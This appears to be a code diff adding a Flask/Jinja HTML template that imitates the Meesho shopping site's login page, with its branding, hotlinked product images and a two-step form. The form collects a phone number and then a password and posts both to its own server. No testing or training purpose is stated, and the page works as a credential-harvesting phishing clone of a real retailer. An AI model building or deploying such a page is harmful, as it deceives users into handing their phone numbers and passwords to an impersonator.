@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meesho - Login</title>
+    <link rel="stylesheet" href="/static/style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <!-- Header -->
+    <header class="meesho-header">
+        <div class="header-container">
+            <div class="logo">meesho</div>
+            <div class="search-box">
+                <span class="search-icon">🔍</span>
+                <input type="text" placeholder="Try Saree, Kurti or Search by Product Code">
+            </div>
+            <div class="nav-links">
+                <a href="#">Become a Supplier</a>
+                <span class="divider">|</span>
+                <a href="#">Investor Relations</a>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <div class="main-wrapper">
+        <div class="content-card">
+            <!-- Banner Section -->
+            <div class="banner">
+                <div class="products-grid">
+                    <div class="product-card">
+                        <img src="https://images.meesho.com/images/products/43772665/9b5b9_512.jpg" alt="Sarees">
+                        <span class="price-tag">₹250</span>
+                        <span class="product-label">Sarees</span>
+                    </div>
+                    <div class="product-card">
+                        <img src="https://images.meesho.com/images/products/32423432/abc_512.jpg" alt="Kurtis">
+                        <span class="price-tag">₹200</span>
+                        <span class="product-label">Kurtis</span>
+                    </div>
+                    <div class="product-card">
+                        <img src="https://images.meesho.com/images/products/12345678/def_512.jpg" alt="Furniture">
+                        <span class="price-tag">₹150</span>
+                    </div>
+                    <div class="product-card">
+                        <img src="https://images.meesho.com/images/products/87654321/ghi_512.jpg" alt="Blazers">
+                        <span class="price-tag">₹175</span>
+                    </div>
+                </div>
+                <div class="banner-text">
+                    <h2>Great Quality<br>Lowest prices</h2>
+                </div>
+            </div>
+
+            <!-- Login Form Section -->
+            <div class="form-section">
+                {% if show_password %}
+                    <!-- Step 2: Password -->
+                    <h1 class="form-title">Enter Password</h1>
+                    
+                    <div class="phone-display-bar">
+                        <div class="country-info">
+                            <span class="country-label">Country</span>
+                            <span class="country-value">IN +91</span>
+                        </div>
+                        <div class="phone-value">{{ phone_value }}</div>
+                        <a href="/" class="change-link">Change</a>
+                    </div>
+
+                    <form method="POST" action="/">
+                        <div class="input-row">
+                            <div class="input-group-full">
+                                <label>Password</label>
+                                <input type="password" name="password" placeholder="Enter your password" required>
+                            </div>
+                        </div>
+                        <button type="submit" class="continue-btn">Continue</button>
+                    </form>
+
+                {% else %}
+                    <!-- Step 1: Phone -->
+                    <h1 class="form-title">Sign Up to view your profile</h1>
+                    
+                    <form method="POST" action="/">
+                        <div class="input-row">
+                            <div class="country-select">
+                                <label>Country</label>
+                                <div class="country-code">IN +91</div>
+                            </div>
+                            <div class="phone-input-group">
+                                <label>Phone Number</label>
+                                <input type="tel" name="phone" placeholder="Phone Number" required maxlength="10">
+                            </div>
+                        </div>
+                        <button type="submit" class="continue-btn">Continue</button>
+                    </form>
+                {% endif %}
+            </div>
+        </div>
+    </div>
+</body>
+</html>
